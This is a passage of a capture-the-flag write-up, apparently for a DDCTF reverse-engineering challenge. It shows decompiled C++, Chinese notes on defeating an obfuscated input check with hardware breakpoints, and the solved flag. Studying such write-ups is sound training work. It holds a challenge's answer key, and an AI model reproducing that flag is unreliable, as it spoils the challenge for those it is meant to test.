  <span class="n">std</span><span class="o">::</span><span class="n">__cxx11</span><span class="o">::</span><span class="n">basic_string</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">allocator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;::</span><span class="n">basic_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v8</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
  <span class="n">std</span><span class="o">::</span><span class="n">operator</span><span class="o">&gt;&gt;&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">allocator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cin</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v8</span><span class="p">);</span>
  <span class="n">sub_4069D6</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v8</span><span class="p">);</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">sub_4013E6</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v8</span><span class="p">,</span> <span class="mi">10LL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
      <span class="n">v5</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="p">)</span>
    <span class="n">v6</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">operator</span><span class="o">&lt;&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">,</span> <span class="s">"WELL DONE!"</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="n">v6</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">operator</span><span class="o">&lt;&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="p">,</span> <span class="s">"wrong answer"</span><span class="p">);</span>
  <span class="n">std</span><span class="o">::</span><span class="n">ostream</span><span class="o">::</span><span class="n">operator</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;</span><span class="p">);</span>
  <span class="n">std</span><span class="o">::</span><span class="n">__cxx11</span><span class="o">::</span><span class="n">basic_string</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">char_traits</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">,</span><span class="n">std</span><span class="o">::</span><span class="n">allocator</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;&gt;::~</span><span class="n">basic_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v8</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>有两个检查，第一个检查与第二题RE类似，就是检查是否0-9A-F，第二个检查使用了类似OLLVM的混淆，使用硬件断点跟踪输入的读取，发现在0x405FA3附近进行了读取，并且与某个值进行相减，如果相减不为0程序退出，相减为0后续还会读取输入</p>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span> <span class="n">v47</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">vm</span><span class="p">.</span><span class="n">p_input</span><span class="p">)</span><span class="o">++</span><span class="p">;</span><span class="c1">// 读取输入0x12</span>
        <span class="o">**</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">**</span><span class="p">)</span><span class="n">vm</span><span class="p">.</span><span class="n">field_10</span> <span class="o">-=</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span>         <span class="c1">// 0x79 - 0x12</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v12</span> <span class="p">)</span>
          <span class="n">v12</span> <span class="o">=</span> <span class="mi">162LL</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v47</span> <span class="p">)</span>
</pre></div>
<p>在0x405FC6下断点，例如输入1234567890,第一轮比较0x79和0x12，所以将输入改为7934567890继续看第二轮的比较（或者改寄存器），重复以上步骤得到flag</p>
<pre><code>.text:0000000000405FC4                 mov     eax, edx
.text:0000000000405FC6                 sub     ecx, eax
.text:0000000000405FC8                 mov     eax, ecx</code></pre>
<p>flag: DDCTF{79406C61E5EEF319CECEE2ED8498}</p>
</div>
</div>